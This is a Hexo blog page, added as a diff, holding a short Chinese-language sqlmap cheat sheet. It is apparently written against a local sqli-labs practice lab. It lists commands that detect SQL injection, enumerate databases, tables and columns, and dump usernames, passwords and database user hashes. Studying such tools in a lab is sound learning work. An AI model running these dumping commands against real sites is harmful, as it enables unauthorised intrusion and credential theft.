@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>sqlmap语法 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="sqlmap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap语法">
+<meta property="og:url" content="http://yoursite.com/2020/06/09/sqlmap%E7%94%A8%E6%B3%95/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="sqlmap">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-06-08T17:58:00.000Z">
+<meta property="article:modified_time" content="2020-06-09T11:52:22.602Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="sqlmap">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-sqlmap用法" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/06/09/sqlmap%E7%94%A8%E6%B3%95/" class="article-date">
+  <time datetime="2020-06-08T17:58:00.000Z" itemprop="datePublished">2020-06-09</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/sqlmap/">sqlmap</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sqlmap语法
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ol>
+<li><p>判断是否存在注入<br>sqlmap.py -u “目标URL”<br>sqlmap.py -u “<a href="http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;</a>  </p>
+</li>
+<li><p>从一个包含有WEB数据包的txt文件中加载HTTP请求，SQLMAP可以从一个文本文件中获取HTTP请求，这样就可以不设置其它参数（如cookie,POST数据等）<br>sqlmap.py -r 文件路径          <strong><em>(-r参数一般在存在cookie注入时使用)</em></strong><br>sqlmap.py -r H:\下载\sqli.txt</p>
+</li>
+<li><p>查询当前用户下的所有数据库<br>sqlmap.py -u “目标URL” –dbs<br>sqlmap.py -u “<a href="http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;</a> –dbs</p>
+</li>
+<li><p>获取某一数据库中所有的表名<br>sqlmap.py -u “目标URL” -D 数据库名 –tables<br>sqlmap.py -u “<a href="http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;</a> -D security –tables  </p>
+</li>
+<li><p>获取某一数据库中某一表下的所有字段名<br>sqlmap.py -u “目标URL” -D 数据库名 -T 表名 –columns<br>sqlmap.py -u “<a href="http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;</a> -D security -T users –columns</p>
+</li>
+<li><p>获取某一数据库中某一表下的某些字段内容<br>sqlmap.py -u “目标URL” -D 数据库名 -T 表名 -C 字段名,字段名 –dump<br>sqlmap.py -u “<a href="http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;</a> -D security -T users -C username,password –dump</p>
+</li>
+<li><p>获取某一数据库中某一表下的所有字段内容<br>sqlmap.py -u “目标URL” -D 数据库名 -T 表名 –dump<br>sqlmap.py -u “<a href="http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;</a> -D security -T users  –dump</p>
+</li>
+<li><p>获取数据库的所有用户（在当前用户有权限读取包含所有用户表的权限时）<br>sqlmap.py -u “目标URL” –users</p>
+</li>
+<li><p>获取数据库用户的密码<br>sqlmap.py -u “目标URL” –passwords</p>
+</li>
+<li><p>获取当前网站数据库的名称<br>sqlmap.py -u “目标URL” –current-db  </p>
+</li>
+<li><p>获取当前网站的数据库的用户名称<br>sqlmap.py -u “目标URL” –current-user</p>
+</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/06/09/sqlmap%E7%94%A8%E6%B3%95/" data-id="ckb98fuxq0002tcwqg941gk3b" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlmap/" rel="tag">sqlmap</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/06/10/requests/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          python之requests模块学习
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/python-requests/">python(requests)</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/sqlmap/">sqlmap</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/python-requests/" rel="tag">python(requests)</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/" rel="tag">sqlmap</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/python-requests/" style="font-size: 10px;">python(requests)</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/06/10/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/10/requests/">python之requests模块学习</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/09/sqlmap%E7%94%A8%E6%B3%95/">sqlmap语法</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
